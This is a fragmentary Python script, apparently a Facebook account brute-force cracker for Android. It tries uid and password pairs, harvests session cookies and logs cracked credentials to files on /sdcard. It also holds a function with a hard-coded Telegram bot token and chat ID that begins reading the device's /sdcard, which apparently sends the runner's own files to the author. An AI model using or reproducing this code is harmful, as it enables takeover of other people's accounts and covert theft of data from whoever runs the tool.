...
\033[1;32m[~] AUTHOR    :\033[1;32m HAMIM FARABI
\033[1;32m[~] GITHUB    :\033[1;32m HAMIM-404
\033[1;32m[~] FACEBOOK  :\033[1;32m HAMIM ON PIRE
\033[1;92m══════════════════════════════════════════
\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS HAMIM BRAND\033[;0m\033[1;91m═══>\033[1;92m""")
...
def rcrack1(uid,pwx,tl):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"\n[COOKIE🎁] : {coki}")
                open('/sdcard/HAMIM/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                open('/sdcard/HAMIM-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
...
def sexy():
    ...
    bot_token = '7891057755:AAEBRsG36Q6l2PMAvyn8WftsOP5Uda5Vits' 
    chat_id = '6937980351'
    #-----------( /sdcard
    try:
        sdcard_path = '/sdcard'
